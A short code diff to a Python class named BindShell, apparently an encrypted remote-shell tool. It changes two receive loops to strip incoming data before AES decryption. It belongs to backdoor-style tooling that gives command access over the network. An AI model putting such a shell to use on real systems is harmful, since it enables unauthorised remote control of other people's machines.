@@ -65,7 +65,7 @@ class BindShell:
                 data = s.recv(4096)
 
                 if data:
-                    decrypted = self.aes.decrypt(data)
+                    decrypted = self.aes.decrypt(data.strip())
 
                     if not decrypted or decrypted.strip() == 'exit':
                         self.cleanup(s)
@@ -94,7 +94,7 @@ class BindShell:
                 data = s.recv(4096)
 
                 if data:
-                    decrypted = self.aes.decrypt(data)
+                    decrypted = self.aes.decrypt(data.strip())
                     print decrypted
                 else:
                     break
